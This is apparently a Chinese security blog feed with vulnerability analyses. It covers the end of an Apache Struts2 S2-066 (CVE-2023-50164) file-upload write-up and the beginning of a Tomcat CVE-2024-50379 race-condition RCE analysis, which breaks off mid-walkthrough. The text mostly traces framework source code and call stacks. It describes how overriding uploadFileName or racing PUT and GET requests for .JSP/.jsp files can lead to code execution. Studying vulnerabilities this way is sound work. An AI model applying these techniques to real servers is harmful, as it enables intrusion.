<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">doIntercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (!(action <span class="keyword">instanceof</span> NoParameters)) &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line">        <span class="type">HttpParameters</span> <span class="variable">parameters</span> <span class="operator">=</span> retrieveParameters(ac);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Setting params &#123;&#125;&quot;</span>, getParameterLogMap(parameters));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameters != <span class="literal">null</span>) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; contextMap = ac.getContextMap();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(contextMap, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(contextMap, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(contextMap, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ValueStack</span> <span class="variable">stack</span> <span class="operator">=</span> ac.getValueStack();</span><br><span class="line">        setParameters(action, stack, parameters);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(contextMap, <span class="literal">false</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(contextMap, <span class="literal">false</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(contextMap, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>setParameters</code>方法中<code>parameters</code>被依次遍历检查参数名是否符合约定，并将结果存储到一个新的<code>treeMap</code>中，此时4个参数的先后数据发生了变化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(<span class="keyword">final</span> Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line">        HttpParameters params;</span><br><span class="line">        Map&lt;String, Parameter&gt; acceptableParameters;</span><br><span class="line">        <span class="keyword">if</span> (ordered) &#123;</span><br><span class="line">            params = HttpParameters.create().withComparator(getOrderedComparator()).withParent(parameters).build();</span><br><span class="line">            acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;(getOrderedComparator());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            params = HttpParameters.create().withParent(parameters).build();</span><br><span class="line">            acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isAcceptableParameter(parameterName, action)) &#123;</span><br><span class="line">                acceptableParameters.put(parameterName, entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这时我们发现<code>uploadFileName</code> 排在了<code>UploadFileName</code>的后面，这是不是意味着<code>uploadFileName</code>对应的<code>setUploadFileName</code>方法将<code>UploadFilename</code>设置的值覆盖掉呢？<br><img src="/archives/fe8a0a5d/img_6.png" alt="img_6.png"><br><code>setParameters</code>方法中有一段代码是这样的，它将<code>acceptableParameters</code>的每个元素依次遍历出来然后调用<code>newStack</code>的<code>setParameter</code>方法。<br>这里在进行<code>treeMap</code>遍历的时候是有固定的先后顺序，<code>UploadFileName</code>会被<code>uploadFileName</code>先遍历。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newStack.setParameter(name, value.getObject());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (devMode) &#123;</span><br><span class="line">                    notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>而这个 <code>newStack.setParameter</code>最终会导致<code>Action</code>的属性setter的调用。<br>那么参数到方法名的转化是什么样的呢，我们直接到关键的地方，下面给出从<code>setParameters</code>方法到<code>getDeclaredMethods</code>之间的调用堆栈。  </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">getDeclaredMethods:2680, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2912, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2881, OgnlRuntime (ognl)</span><br><span class="line">hasSetMethod:2952, OgnlRuntime (ognl)</span><br><span class="line">hasSetProperty:2970, OgnlRuntime (ognl)</span><br><span class="line">setProperty:83, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)</span><br><span class="line">setProperty:3356, OgnlRuntime (ognl)</span><br><span class="line">setValueBody:134, ASTProperty (ognl)</span><br><span class="line">evaluateSetValueBody:220, SimpleNode (ognl)</span><br><span class="line">setValue:308, SimpleNode (ognl)</span><br><span class="line">setValue:780, Ognl (ognl)</span><br><span class="line">execute:436, OgnlUtil$1 (com.opensymphony.xwork2.ognl)</span><br><span class="line">execute:428, OgnlUtil$1 (com.opensymphony.xwork2.ognl)</span><br><span class="line">compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:428, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">trySetValue:186, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setValue:173, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameter:157, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">setParameters:214, ParametersInterceptor (com.opensymphony.xwork2.interceptor)</span><br></pre></td></tr></table></figure>
<p>OgnlRuntime#getDeclaredMethods  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List <span class="title function_">getDeclaredMethods</span><span class="params">(Class targetClass, String propertyName, <span class="type">boolean</span> findSets)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ClassCache</span> <span class="variable">cache</span> <span class="operator">=</span> _declaredMethods[findSets ? <span class="number">0</span> : <span class="number">1</span>];</span><br><span class="line">        <span class="type">Map</span> <span class="variable">propertyCache</span> <span class="operator">=</span> (Map)cache.get(targetClass);</span><br><span class="line">        <span class="keyword">if</span> (propertyCache == <span class="literal">null</span> || (result = (List)propertyCache.get(propertyName)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(cache) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">propertyCache</span> <span class="operator">=</span> (Map)cache.get(targetClass);</span><br><span class="line">                <span class="keyword">if</span> (propertyCache == <span class="literal">null</span> || (result = (List)((Map)propertyCache).get(propertyName)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">baseName</span> <span class="operator">=</span> capitalizeBeanPropertyName(propertyName);</span><br><span class="line">                    <span class="type">List</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                    collectAccessors(targetClass, baseName, result, findSets);</span><br><span class="line">                    <span class="keyword">if</span> (propertyCache == <span class="literal">null</span>) &#123;</span><br><span class="line">                        cache.put(targetClass, propertyCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">101</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ((Map)propertyCache).put(propertyName, result.isEmpty() ? NotFoundList : result);</span><br><span class="line">                    <span class="keyword">return</span> result.isEmpty() ? <span class="literal">null</span> : result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result == NotFoundList ? <span class="literal">null</span> : result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>capitalizeBeanPropertyName 方法会对属性名进行处理，如<code>uploadFileName</code>会被处理为<code>UploadFileName</code><br><img src="/archives/fe8a0a5d/img_7.png" alt="img_7.png"><br>然后调用 <code>collectAccessors</code> 查找对应的方法添加到<code>result</code>中。<br><img src="/archives/fe8a0a5d/img_8.png" alt="img_8.png"><br>最终在<code>ognl.OgnlRuntime.invokeMethodInsideSandbox</code>方法中完成<code>Action</code>属性的设置。<br><img src="/archives/fe8a0a5d/img_9.png" alt="img_9.png"><br>这样便完成了<code>UploadAction</code>的<code>uploadFileName</code>属性的覆盖。<br><img src="/archives/fe8a0a5d/img_10.png" alt="img_10.png"><br>当用户程序未对<code>uploadFileName</code>的值进行检查的时候可能会导致可上传任意文件到任意目录，通过上传<code>.jsp</code>文件的方式便有可能造成代码执行漏洞，或者上传<code>ssh</code>密钥等。  </p>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>在<code>HTTPParameters</code>中添加<code>remove</code>方法以删除通过表单上传的参数。<br><img src="/archives/fe8a0a5d/img_11.png" alt="img_11.png"><br><img src="/archives/fe8a0a5d/img_12.png" alt="img_12.png">   </p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://github.com/apache/struts/compare/STRUTS_6_3_0_1...STRUTS_6_3_0_2">代码diff</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Apache Struts2</tag>
        <tag>S2-066</tag>
        <tag>任意文件上传</tag>
        <tag>CVE-2023-50164</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 条件竞争导致远程代码执行（CVE-2024-50379/CVE-2024-56337）</title>
    <url>/archives/172295c.html</url>
    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>该漏洞是由于Tomcat在验证文件路径时存在缺陷，如果readonly参数被设置为false（这是一个非标准配置），并且服务器允许通过PUT方法上传文件，<br>那么攻击者就可以上传含有恶意JSP代码的文件。通过不断地发送请求，攻击者可以利用条件竞争，使得Tomcat解析并执行这些恶意文件，从而实现远程代码执行。  </p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt; 11.0.2<br>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt; 10.1.34<br>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt; 9.0.98   </p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>该漏洞只在大小写不敏感的操作系统下发生，故所有测试环境均基于Windows系统。<br>下载 <code>Tomcat 9.0.97</code> 版本，解压后<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.97/bin/">下载地址</a><br>下载对应版本的源代码<a href="https://github.com/apache/tomcat/releases/tag/9.0.97">下载地址</a><br>配置ROOT APP 修改<code>web.xml</code>文件，设置<code>DefaultServlet</code>的<code>readonly</code>属性为false，即对静态资源启动PUT方法以为ROOT APP添加静态文件。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时我们可以使用类似下面这样的请求在 ROOT APP中新增一个静态文件。 </p>
<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/test.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-subunit">&lt;html&gt;</span></span><br><span class="line"><span class="language-subunit">&lt;body&gt;</span></span><br><span class="line"><span class="language-subunit"><span class="keyword">test</span></span></span><br><span class="line"><span class="keyword"><span class="language-subunit"></span>&lt;body&gt;</span></span><br><span class="line"><span class="language-subunit">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样请求体中的内容将被写入到 ROOT APP 的根目录下。</p>
<p>选择较低版本的JDK对tomcat进行启动，我这里使用的是<code>8u202</code>，因为较高版本的JDK规范化路径缓存默认是禁用的，而该漏洞需要这个选项开启。<br>进入<code>Tomcat</code>根目录的<code>/bin</code>目录下执行以下命令启动tomcat并启动调试  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">catalina.bat jpda start</span><br></pre></td></tr></table></figure>
<p>启动后程序默认监听在8000端口<br>使用idea打开Tomcat源代码，并配置调试选项，设置调试端口为8000<br><img src="/archives/172295c/img.png" alt="img.png">  </p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>这里我直接先介绍漏洞成因，以方便我对该漏洞进行说明。<br>当Tomcat的某一个APP的启动了静态文件的写入功能时（即readonly参数被设置为false），此时服务器允许通过PUT方法上传文件。此时我们可以通过PUT方法<br>想服务器上传一个名为<code>test.JSP</code>的文件，然后在该文件没有正式落地的时候，通过GET请求访问<code>test.jsp</code>，在特殊的时机下静态资源文件<code>test.JSP</code>将被作为动态<br>的<code>jsp</code>文件解析，从而导致远程代码执行。<br>值得关注的点时<code>test.JSP</code>是被作为静态资源文件由<code>DefaultServlet</code>进行解析处理的，而<code>test.jsp</code>则是作为动态文件由<code>JspServlet</code>进行解析处理的，<br>或者说<code>JspServlet</code>只处理<code>.jsp</code>以及<code>.jspx</code>作为后缀的文件（JspServlet是大小写敏感的），而<code>test.JSP</code>或者<code>test.Jsp</code>这类文件都被认为是静态资源文件<br>由<code>DefaultServlet</code>处理。<br>因为我们的payload访问的是<code>test.jsp</code>，该请求是由<code>JspServlet</code>处理的，所以我们从<code>JspServlet</code>的<code>serviceJspFile</code>方法开始。<br><code>jspUri</code>即我们传入的<code>test.jsp</code>，这里跟进到<code>getResource</code>方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">serviceJspFile</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                HttpServletResponse response, String jspUri,</span></span><br><span class="line"><span class="params">                                <span class="type">boolean</span> precompile)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JspServletWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> rctxt.getWrapper(jspUri);</span><br><span class="line">        <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">                <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Check if the requested JSP page exists, to avoid</span></span><br><span class="line">                    <span class="comment">// creating unnecessary directories and files.</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">null</span> == context.getResource(jspUri)) &#123;</span><br><span class="line">                        handleMissingResource(request, response, jspUri);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    wrapper = <span class="keyword">new</span> <span class="title class_">JspServletWrapper</span>(config, options, jspUri,</span><br><span class="line">                                                    rctxt);</span><br><span class="line">                    rctxt.addWrapper(jspUri,wrapper);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            wrapper.service(request, response, precompile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">            handleMissingResource(request, response, jspUri);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getResource</code>方法位于<code>org.apache.catalina.core.ApplicationContext.getResource</code><br><code>validateResourcePath</code>方法首先检查<code>path</code>是否以<code>/</code>开头，如果以<code>/</code>开头则返回<code>path</code>，否则返回<code>/</code>加上<code>path</code>。<br>然后调用<code>StandRoot</code>的<code>getResource</code>方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> URL <span class="title function_">getResource</span><span class="params">(String path)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">validatedPath</span> <span class="operator">=</span> validateResourcePath(path, !GET_RESOURCE_REQUIRE_SLASH);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (validatedPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(sm.getString(<span class="string">&quot;applicationContext.requestDispatcher.iae&quot;</span>, path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebResourceRoot</span> <span class="variable">resources</span> <span class="operator">=</span> context.getResources();</span><br><span class="line">        <span class="keyword">if</span> (resources != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> resources.getResource(validatedPath).getURL();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果缓存允许缓存则从缓存中查找文件子资源。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebResource <span class="title function_">getResource</span><span class="params">(String path, <span class="type">boolean</span> validate, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (validate) &#123;</span><br><span class="line">            path = validate(path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isCachingAllowed()) &#123;</span><br><span class="line">            <span class="keyword">return</span> cache.getResource(path, useClassLoaderResources);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>noCache</code>方法中指定了一些特殊的文件是不能缓存的，如：.class .jar 或者 classes目录下的文件等。<br>然后从资源缓存列表<code>resourceCache</code>中根据请求的资源路径查找缓存资源，第一次访问时会返回<code>null</code>，即<code>cacheEntry</code>此时为<code>null</code>。<br>然后创建一个 <code>CachedResource</code>对象赋值给<code>cacheEntry</code>并调用其<code>validateResource</code>方法，进入该方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebResource <span class="title function_">getResource</span><span class="params">(String path, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (noCache(path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> root.getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStrategy</span> <span class="variable">strategy</span> <span class="operator">=</span> getCacheStrategy(); <span class="comment">// 默认为空</span></span><br><span class="line">        <span class="keyword">if</span> (strategy != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strategy.noCache(path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.getResourceInternal(path, useClassLoaderResources);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lookupCount.increment();</span><br><span class="line"></span><br><span class="line">        <span class="type">CachedResource</span> <span class="variable">cacheEntry</span> <span class="operator">=</span> resourceCache.get(path); <span class="comment">// 从资源缓存列表中根据请求的资源路径查找缓存资源，</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cacheEntry != <span class="literal">null</span> &amp;&amp; !cacheEntry.validateResource(useClassLoaderResources)) &#123;</span><br><span class="line">            removeCacheEntry(path);</span><br><span class="line">            cacheEntry = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cacheEntry == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">objectMaxSizeBytes</span> <span class="operator">=</span> getObjectMaxSizeBytes();</span><br><span class="line">            <span class="type">CachedResource</span> <span class="variable">newCacheEntry</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">CachedResource</span>(<span class="built_in">this</span>, root, path, getTtl(), objectMaxSizeBytes, useClassLoaderResources);</span><br><span class="line"></span><br><span class="line">            cacheEntry = resourceCache.putIfAbsent(path, newCacheEntry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cacheEntry == <span class="literal">null</span>) &#123;</span><br><span class="line">                cacheEntry = newCacheEntry;</span><br><span class="line">                cacheEntry.validateResource(useClassLoaderResources);</span><br><span class="line">                <span class="type">long</span> <span class="variable">delta</span> <span class="operator">=</span> cacheEntry.getSize();</span><br><span class="line">                <span class="type">long</span> <span class="variable">result</span> <span class="operator">=</span> size.addAndGet(delta);</span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;cache.sizeTracking.add&quot;</span>, Long.toString(delta), cacheEntry, path,</span><br><span class="line">                            Long.toString(result)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (size.get() &gt; maxSize) &#123;</span><br><span class="line">                    <span class="comment">// Process resources unordered for speed. Trades cache</span></span><br><span class="line">                    <span class="comment">// efficiency (younger entries may be evicted before older</span></span><br><span class="line">                    <span class="comment">// ones) for speed since this is on the critical path for</span></span><br><span class="line">                    <span class="comment">// request processing</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">targetSize</span> <span class="operator">=</span> maxSize * (<span class="number">100</span> - TARGET_FREE_PERCENT_GET) / <span class="number">100</span>;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">newSize</span> <span class="operator">=</span> evict(targetSize, resourceCache.values().iterator());</span><br><span class="line">                    <span class="keyword">if</span> (newSize &gt; maxSize) &#123;</span><br><span class="line">                        <span class="comment">// Unable to create sufficient space for this resource</span></span><br><span class="line">                        <span class="comment">// Remove it from the cache</span></span><br><span class="line">                        removeCacheEntry(path);</span><br><span class="line">                        log.warn(sm.getString(<span class="string">&quot;cache.addFail&quot;</span>, path, root.getContext().getName()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Another thread added the entry to the cache</span></span><br><span class="line">                <span class="keyword">if</span> (cacheEntry.usesClassLoaderResources() != useClassLoaderResources) &#123;</span><br><span class="line">                    cacheEntry = newCacheEntry;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Make sure it is validated</span></span><br><span class="line">                cacheEntry.validateResource(useClassLoaderResources);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            hitCount.increment();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cacheEntry;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>该方法首次调用时<code>webResource</code>为<code>null</code><br>然后会进入到<code>StrandardRoot</code>的<code>getResourceInternal</code>方法中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">validateResource</span><span class="params">(<span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="comment">// It is possible that some resources will only be visible for a given</span></span><br><span class="line">        <span class="comment">// value of useClassLoaderResources. Therefore, if the lookup is made</span></span><br><span class="line">        <span class="comment">// with a different value of useClassLoaderResources than was used when</span></span><br><span class="line">        <span class="comment">// creating the cache entry, invalidate the entry. This should have</span></span><br><span class="line">        <span class="comment">// minimal performance impact as it would be unusual for a resource to</span></span><br><span class="line">        <span class="comment">// be looked up both as a static resource and as a class loader</span></span><br><span class="line">        <span class="comment">// resource.</span></span><br><span class="line">        <span class="keyword">if</span> (usesClassLoaderResources != useClassLoaderResources) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (webResource == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (webResource == <span class="literal">null</span>) &#123;</span><br><span class="line">                    webResource = root.getResourceInternal(webAppPath, useClassLoaderResources);</span><br><span class="line">                    getLastModified();</span><br><span class="line">                    getContentLength();</span><br><span class="line">                    nextCheck = ttl + now;</span><br><span class="line">                    <span class="comment">// exists() is a relatively expensive check for a file so</span></span><br><span class="line">                    <span class="comment">// use the fact that we know if it exists at this point</span></span><br><span class="line">                    <span class="keyword">if</span> (webResource <span class="keyword">instanceof</span> EmptyResource) &#123;</span><br><span class="line">                        cachedExists = Boolean.FALSE;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cachedExists = Boolean.TRUE;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>该方法循环遍历<code>allResources</code>的所有元素并调用其<code>getResource</code>方法，直到扎找到资源为止。<br>第一个被调用的<code>WebResourceSet</code>为<code>DirResourceSet</code>。  </p>
